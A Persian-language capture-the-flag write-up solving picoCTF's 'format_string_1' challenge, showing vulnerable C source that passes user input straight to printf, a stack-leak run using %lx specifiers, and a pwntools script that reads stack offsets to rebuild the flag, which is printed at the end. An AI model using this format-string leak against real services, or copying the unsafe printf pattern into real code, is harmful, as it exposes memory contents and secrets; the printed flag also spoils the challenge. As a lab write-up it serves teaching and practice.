---
tags:
  - PWN
---
# format_string_1

 سلام سلام !
 با یه چالش جالب اومدیم از 
 [picoCTF](https://play.picoctf.org/practice/challenge/434) 


این از سورس .
``` c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[1024];
    printf("Give me your order and I'll read it back to you:\n");
    fflush(stdout);
    fgets(buffer, sizeof(buffer), stdin);
    printf("Here's your order: ");
    printf(buffer); // آسیب‌پذیری فرمت استرینگ اینجا است
    printf("Bye!\n");
    fflush(stdout);
    return 0;
}
```

مشاهده می‌کنیم که تابع printf(buffer) بدون مشخص‌کننده فرمت (format specifier) استفاده شده است. این یعنی اگر ورودی ما شامل مشخص‌کننده‌های فرمت مثل %x یا %lx باشد، برنامه مقادیر را از روی پشته (stack) می‌خواند و نمایش می‌دهد. این یک آسیب‌پذیری فرمت استرینگ (format string vulnerability) است که می‌توانیم از آن برای استخراج اطلاعات استفاده کنیم.

رفتار برنامه در عمل اینگونه است:

``` shell
$ ./format-string-1
Give me your order and I'll read it back to you:
1:%lx.2:%lx.3:%lx.4:%lx.5:%lx.6:%lx.7:%lx.8:%lx.9:%lx.10:%lx.11:%lx.12:%lx.13:%lx.14:%lx.15:%lx.16:%lx.17:%lx.18:%lx.19:%lx.20:%lx.
Here's your order: 1:7ffd81524750.2:0.3:0.4:a.5:400.6:6d20746572636573.7:6d65746920756e65.8:a322320.9:7f6580102ab0.10:7ffd00000000.11:7ffd81524978.12:0.13:7ffd81524980.14:7b4654436f636970.15:616c665f656b6166.16:a7d67.17:0.18:0.19:7f65800f8817.20:7f6580103648.
Bye!
```
با ارسال رشته‌ای شامل مشخص‌کننده‌های %lx (برای نمایش مقادیر ۶۴ بیتی در مبنای ۱۶)، مقادیر مختلفی از پشته دریافت کردیم. نکته جالب اینجاست که در آفست ۱۴ مقدار 7b4654436f636970 ظاهر شده که به نظر می‌رسد بخشی از پرچم (flag) باشد.

مقدار 7b4654436f636970 را تحلیل می‌کنیم. این مقدار هگزادسیمال است و به دلیل ترتیب بایت‌ها (endianness) باید برعکس شود. آن را به ASCII تبدیل می‌کنیم:
``` shell
$ echo '7b4654436f636970' | xxd -r -p | rev
picoCTF{
```

حال یک اسکریپت پایتون با استفاده از ماژول pwntools مینویسیم که فلگ را برای ما استخراج کند.
``` py
#!/usr/bin/python
from pwn import *

SERVER = "mimas.picoctf.net"
PORT = 60865

io = remote(SERVER, PORT)
io.sendlineafter(b"Give me your order and I'll read it back to you:\n", b"%14$lx.%15$lx.%16$lx.%17$lx")
output = io.recvlineS().split(':')[1].strip().split('.')
flag = ""
for part in output:
    try:
        flag += p64(int(part, 16)).decode()
    except:
        pass
print(f"پرچم: {flag}")
io.close()
```

فلگ پیدا شد !!!

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`picoCTF{n1m14_57y13_x4_f14g_b5}`</div>

--- 

!!! نویسنده
    [sw33tw3as3l](https://github.com/sw33tw3as3l)